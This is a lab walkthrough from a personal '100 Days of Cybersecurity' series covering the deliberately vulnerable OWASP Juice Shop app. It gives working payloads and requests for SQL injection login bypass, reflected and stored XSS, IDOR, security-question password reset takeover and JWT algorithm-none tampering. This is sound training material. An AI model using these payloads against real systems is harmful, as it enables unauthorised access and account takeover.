# Day 044 - OWASP Juice Shop: Full Walkthrough

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

OWASP Juice Shop is the most comprehensive deliberately vulnerable web application available.

It covers every OWASP Top 10 category - and then some. Unlike DVWA which has isolated modules, Juice Shop is a realistic e-commerce application where vulnerabilities exist in context. Finding them requires actually thinking like an attacker.

Today: a structured walkthrough of the most important vulnerabilities, organised by the OWASP Top 10 categories they represent.

---

## 🚀 Setup

```bash
# Docker (easiest)
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop
# Visit: http://localhost:3000

# npm (alternative)
npm install -g juice-shop
juice-shop
# Visit: http://localhost:3000

# TryHackMe - OWASP Juice Shop room (browser-based, no setup)
# https://tryhackme.com/room/owaspjuiceshop
```

---

## 🎯 Challenge 1 - SQL Injection (A03)

**Target:** Login form

```
Email:    ' OR 1=1--
Password: anything
```

**What happens:** The SQL query becomes:
```sql
SELECT * FROM Users WHERE email='' OR 1=1--' AND password='anything'
```

Returns first user in the database - which is admin. You're in as admin.

**Burp request:**
```
POST /rest/user/login
{"email":"' OR 1=1--","password":"anything"}
```

**Response:**
```json
{"authentication": {"token": "eyJ...", "bid": 1, "umail": "admin@juice-sh.op"}}
```

---

## 🎯 Challenge 2 - XSS (A03)

**Target:** Search bar

```
Payload: <iframe src="javascript:alert(`xss`)">
```

Navigate to: `http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">`

Alert fires. Stored XSS also exists in the product review section.

**Stored XSS in reviews:**
```
POST /api/Products/1/reviews
{"message": "<script>alert('stored xss')</script>", "author": "attacker"}
```

---

## 🎯 Challenge 3 - Broken Access Control / IDOR (A01)

**Target:** User basket

Every user has a basket accessed via: `/rest/basket/{id}`

```bash
# Login as any user, get your basket
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/rest/basket/1

# Change the ID
curl -H "Authorization: Bearer YOUR_TOKEN" \
  http://localhost:3000/rest/basket/2
# Returns another user's basket - IDOR confirmed
```

**Admin panel access:**
```
Navigate to: http://localhost:3000/#/administration
# If you're logged in as admin - full admin panel
# If not - try the SQLi bypass first
```

---

## 🎯 Challenge 4 - Sensitive Data Exposure (A02)

**Target:** FTP server / exposed files

```bash
# Navigate to the FTP directory
http://localhost:3000/ftp

# Files available:
# acquisitions.md  ← confidential business info
# package.json.bak ← tech stack revealed
# eastere.gg       ← easter egg

# Download confidential file
curl http://localhost:3000/ftp/acquisitions.md
```

**Exposed API endpoint:**
```bash
# The package.json reveals the full dependency tree
curl http://localhost:3000/package.json
# Returns all npm packages - reveals versions with known CVEs
```

---

## 🎯 Challenge 5 - Security Misconfiguration (A05)

**Target:** Admin login with default/known credentials

```
Email:    admin@juice-sh.op
Password: admin123
```

The admin account has a weak, guessable password. Basic credential stuffing would find it.

**Also:** Error messages reveal too much:
```bash
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrong"}'

# Response reveals: "Invalid email or password"
# vs invalid email: "No such user" (user enumeration)
```

---

## 🎯 Challenge 6 - Broken Authentication (A07)

**Target:** Password reset mechanism

```bash
# Step 1: Find a user's email (from reviews, scoreboard, etc.)
# jim@juice-sh.op

# Step 2: Request password reset
POST /rest/user/reset-password
{"email": "jim@juice-sh.op", "answer": "?", "new": "hacked123", "repeat": "hacked123"}

# The security question for Jim: "Your eldest sibling's middle name?"
# Jim is a Star Trek fan (visible in reviews)
# Jim Kirk → sibling → "Sam"

# Step 3: Answer the security question
{"email": "jim@juice-sh.op", "answer": "Samuel", "new": "hacked123", "repeat": "hacked123"}
# Password reset successful
```

Security questions are inherently weak authentication - guessable from OSINT.

---

## 🎯 Challenge 7 - API Endpoint Discovery

**Target:** Hidden admin endpoint

```bash
# Check the JavaScript source
curl http://localhost:3000/main.js | grep -o '"[^"]*"' | grep "api\|admin" | sort -u

# Or use Burp: browse the app → check all JS files in HTTP History
# Interesting endpoints found:
# /api/Challenges
# /api/SecurityQuestions
# /api/Users
# /rest/admin/application-version
# /rest/admin/application-configuration

# Access the user list (should require admin, sometimes doesn't)
curl http://localhost:3000/api/Users
```

---

## 🎯 Challenge 8 - JWT Manipulation (A07)

```bash
# After login, decode the JWT token
# Header.Payload.Signature
# Payload: {"data":{"email":"user@juice-sh.op"},"iat":1234}

# Decode payload
echo "eyJkYXRhIjp7ImVtYWlsIjoidXNlckBqdWljZS1zaC5vcCJ9fQ==" | base64 -d
# {"data":{"email":"user@juice-sh.op"}}

# Modify to admin email, re-encode
echo -n '{"data":{"email":"admin@juice-sh.op"}}' | base64
# Try with algorithm none attack

# Using jwt_tool
python3 jwt_tool.py TOKEN -X a  # algorithm none attack
```

---

## 📋 Challenge Tracker

| # | Challenge | Category | Difficulty | Status |
|---|-----------|----------|-----------|--------|
| 1 | Login as admin via SQLi | Injection | ⭐ | |
| 2 | DOM XSS in search | XSS | ⭐ | |
| 3 | Access another user's basket | IDOR | ⭐ | |
| 4 | Access confidential document | Sensitive Data | ⭐ | |
| 5 | Login as admin (default creds) | Misconfiguration | ⭐ | |
| 6 | Reset Jim's password | Broken Auth | ⭐⭐ | |
| 7 | Access admin section | Access Control | ⭐⭐ | |
| 8 | Manipulate JWT token | Auth Failure | ⭐⭐⭐ | |
| 9 | Stored XSS in reviews | XSS | ⭐⭐ | |
| 10 | Find hidden API endpoints | Recon | ⭐⭐ | |

---

## 📝 Notes File

```bash
# Save your notes during the walkthrough
cat > juiceshop_notes.md << 'EOF'
# Juice Shop Notes

## Endpoints Discovered
- /ftp - public file listing
- /rest/basket/{id} - IDOR vulnerable
- /rest/admin/* - admin endpoints
- /api/Users - user list

## Credentials Found
- admin@juice-sh.op : admin123

## Vulnerabilities Confirmed
- SQLi: login form (authentication bypass)
- IDOR: basket ID enumeration
- XSS: search bar, product reviews
- Sensitive data: /ftp/acquisitions.md
- Broken auth: security question bypass
EOF
```

---

## 🔑 Key Takeaways

- Juice Shop demonstrates OWASP Top 10 in a realistic context - not isolated modules
- Every vulnerability from Phase 2 appears here: SQLi, XSS, IDOR, broken auth, API exposure
- JavaScript source code reveals hidden API endpoints - always review JS files
- Security questions are weak authentication - OSINT often answers them
- JWT algorithm none attack is worth trying on every JWT-based auth system
- Taking structured notes during testing is the habit that produces good reports

---

## 📚 Resources
- [OWASP Juice Shop official](https://owasp.org/www-project-juice-shop/)
- [Juice Shop companion guide](https://pwning.owasp-juice.shop/)
- [TryHackMe - OWASP Juice Shop room](https://tryhackme.com/room/owaspjuiceshop)

---

## [⬅️ Day 043](../day043/) | [➡️ Day 045](../day045/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*